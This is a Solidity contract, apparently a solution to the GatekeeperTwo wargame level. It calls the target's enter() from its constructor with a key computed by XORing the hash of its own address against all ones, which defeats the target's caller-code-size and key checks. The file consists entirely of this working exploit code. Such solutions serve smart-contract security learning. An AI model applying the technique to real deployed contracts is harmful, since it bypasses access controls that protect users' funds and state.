import "./GatekeeperTwo.sol";

pragma solidity ^0.5.0;

contract ChallengerTwo {
    constructor(address target) public {
        // the new compiler is much stricter about explicit conversions
        // we need to pack the address to hash it and cast it to the right size uint before truncating it
        uint64 contractHash = uint64(uint(keccak256(abi.encodePacked(address(this)))));
        bytes8 gatekey = bytes8(contractHash ^ uint64(-1));
        GatekeeperTwo(target).enter(gatekey);
    }
}